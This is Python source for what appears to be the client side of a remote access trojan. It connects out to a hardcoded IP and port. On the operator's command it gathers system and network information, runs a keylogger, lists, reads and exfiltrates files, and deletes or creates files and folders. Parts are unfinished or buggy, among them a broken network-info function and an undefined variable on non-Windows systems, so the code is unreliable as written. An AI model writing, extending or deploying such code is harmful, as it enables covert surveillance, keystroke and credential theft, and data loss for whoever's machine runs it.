import socket as st
import os
import shutil
import platform
import psutil
import stat
import sys
from keylogging import *
# from colorama import Fore, Style

def get_network_infos():
    for no, interface, addrs in enumerate(psutil.net_if_addrs().items()):
        return f"""
        Interface {no+1}
        Interface name : {interface}
        IP address : {addrs.address}
        MAC address : {''}
        """
    #RESUME FROM THIS 

def get_system_information():
    if platform.system() == 'Windows':
        getBuildNumber = int(platform.version().split('.')[2])
        if getBuildNumber < 22000:
            os_name = 'Windows 10'
        elif getBuildNumber >= 22000:
            os_name = 'Windows 11'
        else:
            os_name = 'Windows'

    curr_ram = psutil.virtual_memory().total // pow(1024,3)
    return """
    {}\n
    Device name : {}
    System : {}
    OS version : {}
    Architecture : {}
    Machine : {}
    Processor : {}
    Core : {}
    Battery : {}%\n\n
    {}\n
    Disk Usage : {}
    Disk partitions : {}
    RAM : {}
    CPU usage : {}\n\n
    {}
    {}\n
    """.format(
        'SYSTEM INFORMATION'.center(150),
        os_name,
        platform.node(),
        platform.version(),
        platform.architecture(),
        platform.machine(),
        platform.processor(),
        os.cpu_count(),
        psutil.sensors_battery(),
        'DISK INFORMATION'.center(150),
        psutil.disk_usage(os.getcwd()),
        psutil.disk_partitions(),
        curr_ram,
        psutil.cpu_percent(),
        'NETWORK INFORMATION'.center(150),
        get_network_infos()
    ).encode()

def create_thing(get_cmd,sock):
    file_type = get_cmd.split()[1]
    file_or_folder = get_cmd.split()[2]
    
    if file_type == 'file':
        try:
            with open(file_or_folder,'w') as f:
                f.write('')
            sock.send('the file \'{}\' created at target successfully'.format(file_or_folder).encode())
        except Exception as err:
            sock.send(str(err).encode())
    
    elif file_type == 'folder':
        try:
            os.makedirs(file_or_folder)
            sock.send(b'the file \'{}\' created at target successfully')
        except Exception as err:
            sock.send(str(err).encode())

    else:
        print('will write help for touch command')

def main_root():
    sock = st.socket(st.AF_INET, st.SOCK_STREAM)
    sock.connect(('192.168.6.119',2222))

    while True:
        get_cmd = sock.recv(1024).decode().strip()
        if not get_cmd:  
            print("Connection closed by server.")
            break 

        try:
            if get_cmd.startswith('cd '):  
                _dir = get_cmd.split(maxsplit=1)[1]  
                os.chdir(_dir)  
                sock.send(b"Directory changed successfully\n")

            elif get_cmd == 'log keys':
                logkeys(sock=sock)

            elif get_cmd in ('exit','quite'):
                sock.close()
                sys.exit()

            elif get_cmd.startswith('touch '):
                create_thing(get_cmd,sock)

            elif get_cmd == 'sysinfo':
                sock.send(get_system_information())

            elif get_cmd.startswith('which '):
                get_exec = get_cmd.split()[1]
                get_exec_loc = shutil.which(get_exec)
                sock.send(get_exec_loc.encode())

            elif get_cmd.startswith('rm '):
                file_name = get_cmd.split()[1]
                if os.path.exists(file_name):
                    os.chmod(file_name,stat.S_IWRITE)
                    os.remove(file_name)
                    sock.send('The file \'{}\' removed successfully'.format(file_name).encode())
                else:
                    sock.send('The file \'{}\' doesnt exist'.format(file_name).encode())

            elif get_cmd.startswith('rmdir '):
                folder_name = get_cmd.split()[1]
                if os.path.exists(folder_name):
                    os.chmod(folder_name,stat.S_IWRITE)
                    shutil.rmtree(folder_name)
                    sock.send('The folder \'{}\' removed successfully'.format(folder_name).encode())
                else:
                    sock.send('The folder \'{}\' doesnt exist'.format(folder_name).encode())

            elif get_cmd == 'ls':
                _dir = os.getcwd()
                files = '\n'.join(os.listdir(_dir))
                sock.sendall(files.encode() + b'\n')
            
            elif get_cmd.startswith('cat '):  # Read and send file contents
                file_path = get_cmd.split()[1]
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    with open(file_path, "r") as f:
                        sock.sendall(f.read().encode())
                else:
                    sock.send(b"Error: File not found\n")

            elif get_cmd.startswith('download '):  
                try:
                    dfile = '{}/{}'.format(os.getcwd(),get_cmd.split()[1])
                    if os.path.isfile(dfile):
                        with open(dfile,'rb') as file:
                            sock.sendfile(file)
                        sock.shutdown(st.SHUT_WR)
                        file.close()
                    else:
                        sock.send('{} is not a file'.format(dfile).encode())
                except Exception as e:
                    sock.send(str(e).encode())


            elif get_cmd in ('pwd', 'cwd'):  
                sock.send(os.getcwd().encode() + b"\n")

            else:
                sock.send('Invalid command found : {}'.format(get_cmd).encode())

        except Exception as err:
            # print(err)
            sock.send(str(err).encode())
            continue
        
        except ConnectionResetError:
            sock.close()
            break

    sock.close()
